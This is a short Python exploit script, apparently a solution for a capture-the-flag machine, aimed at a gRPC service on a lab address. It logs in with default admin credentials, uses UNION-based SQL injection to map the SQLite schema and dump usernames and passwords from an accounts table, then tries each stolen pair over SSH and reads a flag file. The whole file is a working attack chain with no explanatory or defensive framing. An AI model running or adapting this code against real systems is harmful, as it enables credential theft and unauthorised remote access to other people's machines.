import grpc
import SimpleApp_pb2_grpc as pb2_grpc
import SimpleApp_pb2 as pb2
import json
import paramiko

host = "10.10.11.214"
port = 50051

def make_get_id_req(token, query):
    metadata = (('token',token),)
    id_request = pb2.getInfoRequest(id=query)
    r = stub.getInfo.with_call(id_request, metadata=metadata)
    return(r[0].message)

channel = grpc.insecure_channel(f"{host}:{port}")
stub = pb2_grpc.SimpleAppStub(channel)

user = pb2.LoginUserRequest(username="admin", password="admin")
response, call = stub.LoginUser.with_call(user)
metadata = call.trailing_metadata()
token = metadata[0].value[2:-1]

query = "62 UNION SELECT name FROM sqlite_master where type='table'"
table = make_get_id_req(token, query)

query = f"62 UNION SELECT GROUP_CONCAT(name) FROM pragma_table_info('{table}')"
cols = make_get_id_req(token, query)

res = []
for col in cols.split(","):
    query = f"62 UNION SELECT GROUP_CONCAT({col}) FROM accounts"
    r = make_get_id_req(token, query)
    res.append(r.split(','))

usernames = res[0]
passwords = res[1]

users = []
for i in range(len(usernames)):
    users.append({"username":usernames[i], "password":passwords[i]})

client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

for user in users:
    try:
        client.connect("10.10.11.214", username=user["username"], password=user["password"])
        ssh_stdin, ssh_stdout, ssh_stderr = client.exec_command("cat user.txt")

        print(ssh_stdout.read().decode('utf-8'))

    except paramiko.ssh_exception.AuthenticationException:
        continue

    
